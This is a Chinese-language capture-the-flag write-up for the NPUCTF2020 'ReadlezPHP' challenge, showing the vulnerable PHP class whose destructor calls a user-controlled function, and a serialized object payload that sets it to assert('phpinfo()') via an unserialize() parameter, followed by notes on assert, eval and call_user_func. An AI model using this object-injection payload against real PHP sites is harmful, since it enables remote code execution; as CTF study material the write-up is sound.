---
title: NPUCTF2020-ReadlezPHP
date: 2025-03-29 01:34:13
tags:
- php特性
- assert和eval
- 动态调用方法
category:
- 刷题笔记
---

# NPUCTF2020-ReadlezPHP

打开源代码发现一个./time.php?source，访问一下

```
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);


2025-03-29 06:41:48
```

这题应该是要构造序列化来通过`echo $b($a);`拿flag

构造payload

```
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "phpinfo()";
        $this->b = "assert";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

@$ppp = serialize($c);
echo $ppp;
?>

```

```
?data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

或者用`call_user_func(phpinfo)`

然后就能在phpinfo里找到payload了

---

## 知识点

## assert和eval

[PHP assert 和 eval不同](https://blog.csdn.net/ojingzhiyuan12/article/details/88556074)

assert()可以将整个字符串参数当作php参数执行，
而类似的eval()函数是执行合法的php代码，eval()里的引号必须是双引号，因为单引号不能解析字符串里的变量$str，且必须以分号结尾，函数调用除外。

如：
这样是不行的。

```
<?php
echo eval(echo 1);
?>
```

这样就可以了。

```
<?php
echo eval("echo 1;");
?>
注意：assert把整个字符串参数当php代码执行，eval把合法的php代码执行。
```

call_user_func把第一个参数当作回调函数使用。
回调函数：把一个函数当作作为外层函数的参数，相当于把函数嵌入到外层函数中。





